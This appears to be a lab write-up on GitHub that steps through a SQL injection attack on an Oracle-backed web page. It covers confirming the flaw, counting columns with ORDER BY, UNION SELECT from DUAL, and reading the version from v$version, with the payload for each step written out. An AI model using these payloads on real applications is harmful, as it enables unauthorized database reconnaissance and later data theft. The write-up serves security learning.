# SQL-injection-attack-querying-the-database-type-and-version-on-Oracle

> # (1) To be sure that it has an sql vulnerability: url' -> internal server error. That means it has a vulnerability
![image](https://user-images.githubusercontent.com/59218362/208419556-a6f17621-237e-48f5-b8b2-6ed3921c833a.png)











> # (2) To know the number of column: 'ORDER BY 3-- -> internal server error. It means there are 2 columns
![image](https://user-images.githubusercontent.com/59218362/208419394-038bbc5a-d0b3-43b3-a354-62f0b5d009fb.png)
![image](https://user-images.githubusercontent.com/59218362/208419254-4f09eb82-d337-4da7-b75c-7421953397dd.png)











> # (3) To know which column is data retrieving: ‘UNION SELECT NULL,'Data'--. But got error. It is because the database is oracle
![image](https://user-images.githubusercontent.com/59218362/208419051-fa25dbc1-36fd-4a9e-96ff-9ddbb13abde3.png)











> # (4) To know data retrieve in oracle database: 'UNION SELECT 'sajib','rajib' FROM DUAL--. See we find out 2 both 2 column are retrieving data
![image](https://user-images.githubusercontent.com/59218362/208418870-00c353a4-c3b8-457c-bea7-3cc0eb951824.png)











> # (5) To know the version of oracle database: 'UNION SELECT banner, banner FROM v$version--. Here two banner is for the 2 columns.
![image](https://user-images.githubusercontent.com/59218362/208418752-2b3a8c05-feac-4081-9b64-f13c018b5a91.png)

